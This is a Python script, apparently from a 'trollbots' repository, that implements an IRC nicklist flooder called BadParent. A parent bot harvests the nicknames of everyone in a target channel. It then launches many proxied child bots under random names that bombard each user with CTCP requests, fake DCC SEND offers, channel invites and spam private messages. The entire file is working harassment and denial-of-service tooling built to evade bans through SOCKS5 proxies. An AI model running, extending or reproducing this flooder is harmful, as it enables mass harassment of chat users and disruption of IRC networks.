#!/usr/bin/env python
# BadParent IRC Nicklist Flooder
# Developed by acidvegas in Python 3
# https://github.com/acidvegas/trollbots
# badparent.py

import concurrent.futures
import os
import random
import ssl
import socket
import sys
import threading
import time

sys.dont_write_bytecode = True

import config

# Globals
attacks    = list()
proxy_file = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'proxies.txt')

def alert(msg):
    print(f'{get_time()} | [+] - {msg}')

def debug(msg):
    print(f'{get_time()} | [~] - {msg}')

def error(msg, reason=None):
    if reason:
        print(f'{get_time()} | [!] - {msg} ({reason})')
    else:
        print(f'{get_time()} | [!] - {msg}')

def error_exit(msg):
    raise SystemExit(f'{get_time()} | [!] - {msg}')

def get_time():
    return time.strftime('%I:%M:%S')

def keep_alive():
    try:
        while True:
            input('')
    except KeyboardInterrupt:
        sys.exit()

def random_int(min, max):
    return random.randint(min, max)

def random_str(size):
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(size))

class parent(object):
    server   = config.server
    port     = config.port
    use_ipv6 = config.use_ipv6
    use_ssl  = config.use_ssl
    proxy    = config.proxy
    vhost    = config.vhost
    password = config.password
    channel  = config.channel
    key      = config.key
    username = config.username
    realname = config.realname
    timeout  = config.timeout

    def __init__(self):
        self.nickname = config.nickname
        self.sock     = None

    def connect(self):
        try:
            self.create_socket()
            self.sock.connect((self.server, self.port))
            if self.password:
                self.raw('PASS ' + self.password)
            self.raw(f'USER {self.username} 0 * :{self.realname}')
            self.nick(self.nickname)
        except Exception as ex:
            error('Failed to connect to IRC server.', ex)
            self.event_disconnect()
        else:
            self.listen()

    def create_socket(self):
        if self.use_ipv6:
            family = socket.AF_INET6
        else:
            family = socket.AF_INET
        if self.proxy :
            proxy_server, proxy_port = self.proxy.split(':')
            self.sock = socks.socksocket(family, socket.SOCK_STREAM)
            self.sock.setblocking(0)
            self.sock.settimeout(self.timeout)
            self.sock.setproxy(socks.PROXY_TYPE_SOCKS5, proxy_server, int(proxy_port))
        else:
            self.sock = socket.socket(family, socket.SOCK_STREAM)
        if self.vhost:
            self.sock.bind((self.vhost,0))
        if self.use_ssl:
            self.sock = ssl.wrap_socket(self.sock)

    def event_connect(self):
        self.join_channel(self.channel, self.key)

    def event_disconnect(self):
        error('The parent bot has disconected!')
        self.sock.close()

    def event_end_of_names(self, chan):
       if config.nicklist:
           alert(f'Found {len(config.nicklist)} nicks in channel.')
           threading.Thread(target=load_children).start()
       else:
           error('Failed to parse nicklist from channel.')

    def event_join(self, nick, chan):
        if nick not in config.nicklist:
            config.nicklist.append(nick)

    def event_kick(self, nick, chan, kicked):
        if kicked == self.nickname:
            time.sleep(3)
            self.join(self.chan, self.key)

    def event_names(self, chan, names):
        for name in names:
            if name[:1] in '~!@%&+:':
                name = name[1:]
            if name != self.nickname and name not in config.nicklist:
                config.nicklist.append(name)

    def event_nick(self, nick, new):
        if nick in config.nicklist:
            config.nicklist.remove(nick)
            config.nicklist.append(new)
            debug('Updated the nicklist from a client nick change.')

    def event_nick_in_use(self):
        self.nickname = self.nickname + '_'
        self.nick(self.nickname)

    def event_quit(self, nick):
        if nick in config.nicklist:
            config.nicklist.remove(nick)
            debug('Updated the nicklist from a client quit.')

    def handle_events(self, data):
        args = data.split()
        if args[0] == 'PING':
            self.raw('PONG ' + args[1][1:])
        elif args[1] == '001':
            self.event_connect()
        elif args[1] == '433':
            self.event_nick_in_use()
        elif args[1] == '353':
            chan = args[4]
            if ' :' in data:
                names = data.split(' :')[1].split()
            elif ' *' in data:
                names = data.split(' *')[1].split()
            elif ' =' in data:
                names = data.split(' =')[1].split()
            else:
                names = data.split(chan)[1].split()
            self.event_names(chan, names)
        elif args[1] == '366':
            chan = args[3]
            self.event_end_of_names(chan)
        elif args[1] == 'JOIN':
            nick = args[0].split('!')[0][1:]
            chan = args[2][1:]
            self.event_join(nick, chan)
        elif args[1] == 'KICK':
            chan   = args[2]
            kicked = args[3]
            self.event_kick(nick, chan, kicked)
        elif args[1] == 'NICK':
            nick = args[0].split('!')[0][1:]
            new  = args[2][1:]
            self.event_nick(nick, new)
        elif args[1] == 'QUIT' :
            nick = args[0].split('!')[0][1:]
            self.event_quit(nick)

    def join_channel(self, chan, key=None):
        if key:
            self.raw(f'JOIN {chan} {key}')
        else:
            self.raw('JOIN ' + chan)

    def listen(self):
        while True:
            try:
                data = self.sock.recv(1024).decode('utf-8')
                for line in (line for line in data.split('\r\n') if line):
                    #debug(line)
                    pass
                    if line.startswith('ERROR :Closing Link:'):
                        raise Exception('Connection has closed.')
                    elif len(line.split()) >= 2:
                        self.handle_events(line)
            except (UnicodeDecodeError,UnicodeEncodeError) as ex:
                pass
            except Exception as ex:
                error('Unexpected error occured.', ex)
                break
        self.event_disconnect()

    def nick(self, nick):
        self.raw('NICK ' + nick)

    def raw(self, msg):
        self.sock.send(bytes(msg + '\r\n', 'utf-8'))



class child:
    server       = config.server
    port         = config.port
    use_ssl      = config.use_ssl
    use_ipv6     = config.use_ipv6
    password     = config.password
    message      = config.message
    attack_delay = config.attack_delay
    timeout      = config.timeout
    attacks      = attacks

    def __init__(self, proxy):
        self.proxy_server   = proxy.split(':')[0]
        self.proxy_port     = int(proxy.split(':')[1])
        self.connected      = False
        self.invite_channel = '#' + random_str(random_int(5,8))
        self.invite_count   = 0
        self.nickname       = random_str(random_int(5,8))
        self.sock           = None

    def attack(self):
        while True:
            if not self.connected:
                break
            elif not config.nicklist:
                error('Nicklist has become empty!')
                break
            else:
                for name in config.nicklist:
                    option = random.choice(self.attacks)
                    try:
                        if option == 'ctcp':
                            ctcp_type = random.choice(('PING','TIME','VERSION'))
                            self.ctcp(name, ctcp_type)
                        elif option == 'dcc':
                            self.dcc(name, f'{random_str(5)} {random_int(1,255)}.{random_int(1,255)}.{random_int(1,255)}.{random_int(1,255)} {random_int(1000,65000)} {random_int(1,9)}')
                        elif option == 'invite':
                            self.invite(name, self.invite_channel)
                            self.invite_count += 1
                            if self.invite_count >= 10:
                                self.part(self.invite_channel)
                                self.invite_channel = '#' + random_str(random_int(5,8))
                                self.join_channel(self.invite_channel)
                                self.invite_count = 0
                        elif option == 'private':
                            message = '{0} {1} {2}'.format(random_str(random_int(5,10)), self.message, random_str(random_int(5,10)))
                            self.sendmsg(name, message)
                    except:
                        break
                    else:
                        time.sleep(self.attack_delay)

    def connect(self):
        try:
            self.create_socket()
            self.sock.connect((self.server, self.port))
            if self.password:
                self.raw('PASS ' + self.password)
            self.raw('USER {0} 0 * :{1}'.format(random_str(random_int(5,8)), random_str(random_int(5,8))))
            self.nick(self.nickname)
        except Exception as ex:
            self.event_disconnect()
        else:
            self.listen()

    def create_socket(self):
        if self.use_ipv6:
            self.sock = socks.socksocket(socket.AF_INET6, socket.SOCK_STREAM)
        else:
            self.sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setblocking(0)
        self.sock.settimeout(self.timeout)
        self.sock.setproxy(socks.PROXY_TYPE_SOCKS5, self.proxy_server, self.proxy_port)
        if self.use_ssl:
            self.sock = ssl.wrap_socket(self.sock)

    def ctcp(self, target, data):
        self.sendmsg(target, f'\001{data}\001')

    def dcc(self, target, data):
        self.sendmsg(target, f'\x01DCC SEND {data}\x01')

    def event_connect(self):
        alert(f'Successful connection. ({self.proxy_server}:{self.proxy_port})')
        self.connected = True
        self.join_channel(self.invite_channel)
        threading.Thread(target=self.attack).start()

    def event_disconnect(self):
        self.connected = False
        self.sock.close()

    def event_nick_in_use(self):
        self.nickname = random_str(random_int(5,8))
        self.nick(self.nickname)

    def event_no_such_nick(self, nick):
        if nick in config.nicklist:
            config.nicklist.remove(nick)
            debug('Updated the nicklist from an unknown nick.')

    def handle_events(self, data):
        args = data.split()
        if args[0] == 'PING':
            self.raw('PONG ' + args[1][1:])
        elif args[1] == '001':
            self.event_connect()
        elif args[1] == '401':
            nick = args[3]
            self.event_no_such_nick(nick)
        elif args[1] == '433':
            self.event_nick_in_use()

    def invite(self, nick, chan):
        self.raw(f'INVITE {nick} {chan}')

    def join_channel(self, chan, key=None):
        if key:
            self.raw(f'JOIN {chan} {key}')
        else:
            self.raw('JOIN ' + chan)

    def listen(self):
        while True:
            try:
                data = self.sock.recv(1024).decode('utf-8')
                if data:
                    for line in (line for line in data.split('\r\n') if line):
                        if line.startswith('ERROR :Closing Link:'):
                            raise Exception('Connection has closed.')
                        elif len(line.split()) >= 2:
                            self.handle_events(line)
                else:
                    raise Exception('No data recieved from server.')
            except (UnicodeDecodeError,UnicodeEncodeError) as ex:
                pass
            except:
                break
        self.event_disconnect()

    def nick(self, nick):
        self.raw('NICK ' + nick)

    def part(self, chan):
        self.raw('PART ' + chan)

    def raw(self, msg):
        self.sock.send(bytes(msg + '\r\n', 'utf-8'))

    def sendmsg(self, target, msg):
        self.raw(f'PRIVMSG {target} :{msg}')



def load_children():
    debug('Loading children bots...')
    for i in range(config.concurrent_connections):
        debug('Concurrency round starting....')
        with concurrent.futures.ThreadPoolExecutor(max_workers=config.max_threads) as executor:
            checks = {executor.submit(child(proxy).connect): proxy for proxy in proxies}
            for future in concurrent.futures.as_completed(checks):
                checks[future]
    debug('Flooding is complete. (Threads still may be running!)')

# Main
print(''.rjust(56, '#'))
print('#{0}#'.format(''.center(54)))
print('#{0}#'.format('BadParent IRC Nicklist Flooder'.center(54)))
print('#{0}#'.format('Developed by acidvegas in Python 3'.center(54)))
print('#{0}#'.format('https://github.com/acidvegas/trollbots'.center(54)))
print('#{0}#'.format(''.center(54)))
print(''.rjust(56, '#'))
if not sys.version_info.major == 3:
    error_exit('BadParent requires Python version 3 to run!')
try:
    import socks
except ImportError:
    error_exit('Missing PySocks module! (https://pypi.python.org/pypi/PySocks)')
if os.path.isfile(proxy_file):
    proxies = [line.strip() for line in open(proxy_file).readlines() if line]
    debug(f'Loaded {len(proxies)} proxies from file.')
    random.shuffle(proxies)
else:
    error_exit('Missing proxies file!')
if config.dcc:
    attacks.append('dcc')
if config.ctcp:
    attacks.append('ctcp')
if config.invite:
    attacks.append('invite')
if config.private:
    attacks.append('private')
if not attacks:
    error_exit('No attack types have been enabled!')
debug('Starting parent bot connection...')
parent().connect()
keep_alive()